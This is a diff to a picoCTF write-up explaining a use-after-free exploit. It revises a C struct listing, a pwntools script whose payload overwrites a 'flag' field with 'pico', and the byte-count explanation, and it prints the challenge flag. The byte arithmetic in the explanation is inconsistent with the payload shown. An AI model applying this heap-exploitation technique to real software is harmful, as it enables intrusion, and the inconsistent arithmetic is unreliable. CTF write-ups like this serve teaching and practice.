@@ -177,10 +177,10 @@ So, to exploit this program, we can leverage the UAF vulnerability that I previo
     - Recall that the `object` struct has 4 members, for a total of 35 bytes.
     ```c
     typedef struct {
-  char a[10];
-  char b[10];
-  char c[10];
-  char flag[5];
+  char a[10]; // ten bytes
+  char b[10]; // ten bytes
+  char c[10]; // ten bytes
+  char flag[5]; // 5 bytes
 } object;
     ```
 3. While still in the "allocate object" option, we now input a payload string that will contain `"pico"` at the end to overwrite the previous `flag` value `"bico"`.
@@ -199,13 +199,13 @@ r.sendline(b'5')
 r.sendline(b'2')
 
 r.sendline(b'40')
-payload = b'AAAAAAAA'+b'AAAAAAAA'+b'AAAAAAAA'+b'AAAAAApico'
+payload = b'A' * 30 + b'pico'
 
 
 r.sendline(payload)
 r.sendline(b'4')
 r.interactive()
 ```
-All of the `r.sendline`'s are for selecting options in the interface. As for the actual payload, it consists of an initial 24 bytes (8 blocks of A's), and then a final block of 6 A's, and "pico"- for a total of 34 bytes. The reason we are inputting 34 bytes, rather than 35 (which was the size of the original `object` struct, is because the original `object` struct accounted for a [null byte](https://null-byte.wonderhowto.com/newest/).
+All of the `r.sendline`'s are for selecting options in the interface. As for the actual payload, it consists of an initial 24 bytes (8 blocks of A's), and then a final block of 6 A's, and "pico"- for a total of 34 bytes. The reason we are inputting 34 bytes, rather than 35, is because the `flag` field in the `object` struct has a 5 byte space, due to the program accounting for a [null byte](https://null-byte.wonderhowto.com/newest/).
 
 flag: `picoCTF{now_thats_free_real_estate_a7381726}`
